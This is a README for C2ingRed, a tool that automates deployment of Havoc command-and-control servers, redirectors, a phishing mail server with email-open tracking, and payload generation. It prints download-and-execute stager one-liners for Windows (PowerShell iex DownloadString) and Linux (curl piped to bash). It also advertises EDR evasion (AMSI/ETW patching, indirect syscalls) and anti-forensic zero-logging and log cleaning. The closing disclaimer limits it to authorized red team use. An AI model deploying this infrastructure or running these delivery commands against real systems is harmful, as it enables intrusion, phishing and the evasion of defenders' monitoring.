# C2ingRed

A comprehensive automated deployment system for Havoc C2 red team infrastructure.

## Overview

C2ingRed enables rapid deployment of fully configured Command and Control (C2) infrastructure with advanced security features. The tool uses Infrastructure as Code principles to set up Havoc C2 servers and redirectors with security hardening, EDR evasion capabilities, and operational security features in mind.

## Features

- **Fully Automated Deployment**: Deploy complete C2 infrastructure with a single command
- **Multi-provider Support**: AWS, Linode, and FlokiNET support
- **Havoc C2 Framework**: Pre-configured with the latest Havoc C2 (dev branch)
- **Security Hardening**: OPSEC-focused configurations, zero-logging, and secure memory handling
- **Redirector Support**: Separate frontend redirectors to obscure C2 traffic
- **EDR Evasion**: Pre-configured techniques for bypassing EDR solutions
- **Email Infrastructure**: Integrated mail server with DKIM/DMARC for phishing operations
- **Email Tracking**: Optional integrated email tracking server
- **Shell Handler**: Automatic reverse shell handling and payload delivery
- **Port Randomization**: Configurable port randomization for OPSEC considerations
- **Interactive Mode**: Wizard-style deployment for beginners

## Requirements

- Python 3.6+
- Ansible 2.9+
- Provider-specific CLI tools:
  - AWS: `awscli`
  - Linode: `linode-cli`
- SSH keypair for server access

## Installation

1. Clone the repository:
```bash
git clone https://github.com/yourusername/C2ingRed.git
cd C2ingRed
```

2. Install requirements:
```bash
pip install -r requirements.txt
```

3. Configure your provider credentials:
   - AWS: Configure using `aws configure` or provide credentials via arguments
   - Linode: Set up an API token in your Linode account

## Deployment

### Interactive Mode

The easiest way to deploy is using interactive mode:

```bash
./deploy.py --interactive
```

This will guide you through the deployment process step by step.

### Command-line Deployment

For Linode deployment:
```bash
./deploy.py --provider linode --linode-token YOUR_TOKEN --domain your-domain.com --linode-region us-east
```

For AWS deployment:
```bash
./deploy.py --provider aws --aws-key YOUR_KEY --aws-secret YOUR_SECRET --domain your-domain.com --aws-region us-east-1
```

For FlokiNET deployment (with pre-provisioned servers):
```bash
./deploy.py --provider flokinet --flokinet-redirector-ip YOUR_REDIRECTOR_IP --flokinet-c2-ip YOUR_C2_IP --domain your-domain.com
```

### Additional Options

- `--redirector-only`: Deploy only the redirector
- `--c2-only`: Deploy only the C2 server
- `--deploy-tracker`: Deploy phishing email tracking server
- `--teardown`: Clean up existing infrastructure
- `--disable-history`: Disable command history on servers
- `--secure-memory`: Enable secure memory settings
- `--zero-logs`: Enable zero-logs configuration
- `--ssh-after-deploy`: SSH into the instance after deployment

## Post-Deployment

After deployment:

1. Configure DNS records for your domain:
   - Set A record for `your-domain.com` pointing to your C2 server
   - Set A record for `cdn.your-domain.com` (or your configured subdomain) pointing to your redirector
   - Set A record for `mail.your-domain.com` pointing to your C2 server
   
2. Run the post-install script on your C2 server:
   ```bash
   /root/Tools/post_install_c2.sh
   ```
   
3. Run the post-install script on your redirector:
   ```bash
   /root/Tools/post_install_redirector.sh
   ```

## Using Havoc C2

Havoc C2 Framework is installed at `/root/Tools/Havoc` on the C2 server.

### Connecting to the Teamserver

From your local machine:

1. Install the Havoc client (dev branch):
   ```bash
   git clone -b dev https://github.com/HavocFramework/Havoc.git
   cd Havoc/Client
   mkdir build && cd build
   cmake -GNinja ..
   ninja
   ```

2. Connect to the Teamserver:
   ```bash
   ./havoc client --address YOUR_C2_IP:40056 --username admin --password [password]
   ```
   (The password is stored in `/root/Tools/Havoc/data/profiles/default.yaotl`)

### Generating Payloads

Pre-generated payloads are available in `/root/Tools/Havoc/payloads/`. You can create new payloads using:

```bash
cd /root/Tools
./generate_havoc_payloads.sh
```

### Delivery Commands

PowerShell one-liner for Windows targets:
```powershell
powershell -exec bypass -c "iex(New-Object Net.WebClient).DownloadString('https://cdn.your-domain.com/windows_stager.ps1')"
```

Linux one-liner:
```bash
curl -s https://cdn.your-domain.com/linux_stager.sh | bash
```

## Security Features

### EDR Evasion

The built-in Havoc payloads include:
- Sleep masking
- Stack spoofing
- AMSI/ETW patching
- Indirect syscalls
- Binary signature randomization

### OPSEC Features

- Zero-logs configuration
- Secure memory handling
- Automatic log cleaning
- Secure exit scripts

## Email Tracking

If deployed with `--deploy-tracker` or `--integrated-tracker`, the C2 server includes an email tracking system accessible at `track.your-domain.com`.

To track email opens, add this HTML to your emails:
```html
<img src="https://cdn.your-domain.com/px/YOUR_TRACKING_ID.png" height="1" width="1" />
```

## Troubleshooting

Common issues:

1. **SSH Connection Failures**:
   - Check that port 22 is open on your firewall/security group
   - Verify SSH key permissions (should be 600)
   
2. **DNS Issues**:
   - Confirm that your DNS records are properly configured
   - Allow time for DNS propagation (up to 24-48 hours for some providers)

3. **C2 Communication Problems**:
   - Verify redirector configuration
   - Check that all required ports are open
   - Review NGINX configuration for proper redirection

## Cleaning Up

To remove all infrastructure when done:

```bash
./deploy.py --provider PROVIDER --teardown
```

Add your provider-specific arguments to identify the resources to remove.

## Disclaimer

This tool is intended for authorized red team operations, penetration testing, and security research only. Always obtain proper authorization before conducting security testing.